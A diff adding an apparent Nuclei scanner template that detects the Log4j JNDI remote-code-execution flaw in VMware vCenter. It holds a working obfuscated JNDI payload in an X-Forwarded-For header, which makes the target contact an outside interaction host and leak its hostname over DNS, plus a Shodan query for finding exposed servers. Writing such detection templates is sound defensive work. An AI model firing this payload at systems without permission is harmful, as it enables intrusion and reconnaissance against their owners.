@@ -1,0 +1,43 @@
+id: vmware-vcenter-log4j-jndi-rce
+
+info:
+  name: VMware VCenter Log4j JNDI RCE
+  author: _0xf4n9x_
+  severity: critical
+  description: |
+    A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted VMware VCenter.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://twitter.com/tnpitsecurity/status/1469429810216771589
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  metadata:
+    shodan-query: title:"VMware VCenter"
+  tags: cve,cve2021,rce,jndi,log4j,vcenter,vmware,oast
+
+requests:
+  - raw:
+      - |
+        GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
